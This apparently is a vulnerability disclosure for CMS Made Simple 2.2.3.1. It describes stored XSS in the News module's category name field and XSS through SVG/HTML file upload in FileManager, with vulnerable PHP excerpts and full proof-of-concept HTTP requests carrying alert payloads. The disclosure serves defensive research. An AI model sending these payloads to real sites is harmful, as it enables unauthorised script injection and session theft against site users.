# CMSMS 2.2.3.1 Multiple Vulnerabilities

One day I felt like reviewing the source code of some random CMS and I picked CMSMS. This is totally random and I did this to kill boredom.

## Stored XSS

In Setting-New module,you can add category,there is no XSS filtering, resulting in storage-type XSS generation. 
file modules/New/action.addcategory.php,line10~line29.  
    ```` 
    
    $name = trim($params['name']);
    //if( $parent == 0 ) $parent = -1;
    $name = trim($params['name']);
    if ($name != '') {
    $query = 'SELECT news_category_id FROM '.CMS_DB_PREFIX.'module_news_categories WHERE parent_id = ? AND news_category_name = ?';
    $tmp = $db->GetOne($query,array($parent,$name));
    if( $tmp ) {
    echo $this->ShowErrors($this->Lang('error_duplicatename'));
    }
    else {
    $query = 'SELECT max(item_order) FROM '.CMS_DB_PREFIX.'module_news_categories WHERE parent_id = ?';
    $item_order = (int)$db->GetOne($query,array($parent));
    $item_order++;
    $catid = $db->GenID(CMS_DB_PREFIX."module_news_categories_seq");
    $query = 'INSERT INTO '.CMS_DB_PREFIX.'module_news_categories (news_category_id, news_category_name, parent_id, item_order, create_date, modified_date) VALUES (?,?,?,?,NOW(),NOW())';
    $parms = array($catid,$name,$parent,$item_order);
    $db->Execute($query, $parms);
    ````  
The parameter name insert into the database without filtering。

### POC  
    ````
    POST /admin/moduleinterface.php HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 143
    Referer: http://127.0.0.1/
    Cookie: CMSICb6b86d162b=t5qthj5ve9r557omvs3j9slkm4; CMSSESSID4df2b2a65ee6=5osblhhflr07cfmp1730ffn3n0; _sk_=98cf4d97037a4df557b; bef694b94d14a6e115ebafd2d6cd1380=LGb1BagmBwZ6VaIcMPV7nGbkB3Z6BQbvqKAypz5uoJHvB3Z6AGbvLJEgnJ4vB3Z6AGbvL2gmqJ0vB3Z6AQN6Vwp1MzLkZJD3BQAyZzD4MQt3AGIyATH4MzL1BJRlLwMzZJWyLGVjMQHvB3Z6AmbvMJMzK3IcMPV7GwgmBwRlBvWyMzMsqKAypz5uoJHvB047sD%3D%3D
    Connection: close
    Upgrade-Insecure-Requests: 1
    mact=News%2Cm1_%2Caddcategory%2C0&_sk_=98cf4d97037a4df557b&m1_name=%3Csvg%2F+onload%3Dalert%281%29%3E&m1_parent=-1&m1_submit=%E6%8F%90%E4%BA%A4
    
    ````
![](http://ohsqlm7gj.bkt.clouddn.com/17-11-12/94376829.jpg)
![](http://ohsqlm7gj.bkt.clouddn.com/17-11-12/48134010.jpg)
    
## FILE UPLOAD XSS  
In file manager,user can upload any files other than php。If the file ends with html, svg, it can Cause XSS.
file modules/FileManager/action.upload.php,line10~line29.  
    
    protected function is_file_acceptable( $file )
    {
      $config = \cms_config::get_instance();
      if( !$config['developer_mode'] ) {
          $ext = strtolower(substr(strrchr($file, '.'), 1));
          if( startswith($ext,'php') || endswith($ext,'php') ) return FALSE;
      }
      return TRUE;
  }
  
  It only intercepts PHP files.
  
  

### poc
   ```
   POST /admin/moduleinterface.php HTTP/1.1
   Host: 127.0.0.1
   User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
   Accept: application/json, text/javascript, */*; q=0.01
   Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
   X-Requested-With: XMLHttpRequest
   Referer: http://127.0.0.1/
   Content-Length: 865
   Content-Type: multipart/form-data;
   boundary=---------------------------135822859015495
   Cookie: CMSICb6b86d162b=t5qthj5ve9r557omvs3j9slkm4; CMSSESSID4df2b2a65ee6=5osblhhflr07cfmp1730ffn3n0; _sk_=98cf4d97037a4df557b; bef694b94d14a6e115ebafd2d6cd1380=LGb1BagmBwZ6VaIcMPV7nGbkB3Z6BQbvqKAypz5uoJHvB3Z6AGbvLJEgnJ4vB3Z6AGbvL2gmqJ0vB3Z6AQN6Vwp1MzLkZJD3BQAyZzD4MQt3AGIyATH4MzL1BJRlLwMzZJWyLGVjMQHvB3Z6AmbvMJMzK3IcMPV7GwgmBwRlBvWyMzMsqKAypz5uoJHvB047sD%3D%3D
   Connection: close
   -----------------------------135822859015495
   Content-Disposition: form-data; name="mact"
   FileManager,m1_,upload,0
   -----------------------------135822859015495
   Content-Disposition: form-data; name="_sk_"
   98cf4d97037a4df557b
   -----------------------------135822859015495
   Content-Disposition: form-data; name="disable_buffer"
   1
   -----------------------------135822859015495
   Content-Disposition: form-data; name="m1_files[]"; filename="svg.svg"
   Content-Type: image/png
   <svg id="rectangle"
   xmlns="http://www.w3.org/2000/svg"
   xmlns:xlink="http://www.w3.org/1999/xlink"
   width="100" height="100">
   <foreignObject width="100" height="50"
   requiredExtensions="http://www.w3.org/1999/xhtml">
   <embed xmlns="http://www.w3.org/1999/xhtml" 
   src="javascript:alert('xss')" />
   </foreignObject>
   </svg>
   -----------------------------135822859015495--
   ```

![](http://ohsqlm7gj.bkt.clouddn.com/17-11-12/40567149.jpg)

    
